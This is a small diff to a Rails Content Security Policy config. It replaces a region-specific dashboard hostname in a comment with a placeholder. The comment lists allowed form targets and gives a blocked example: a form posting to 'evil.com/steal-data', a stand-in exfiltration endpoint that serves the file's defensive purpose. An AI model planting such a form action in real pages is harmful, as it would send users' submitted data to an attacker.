@@ -89,7 +89,7 @@ Rails.application.config.content_security_policy do |policy|
   # *domains = explicitly allow dashboard domain (needed for OAuth2 proxy)
   # Note: OAuth2 proxy can cause Rails form helpers to generate absolute URLs
   # ✅ Allowed: <form action="/users" method="post">,
-  #            <form action="https://dashboard.qa-de-1.cloud.sap/monsoon3/accept_terms_of_use">
+  #            <form action="https://dashboard.REGION.cloud.sap/monsoon3/accept_terms_of_use">
   # ❌ Blocked: <form action="https://evil.com/steal-data" method="post">
   policy.form_action :self, *domains
 
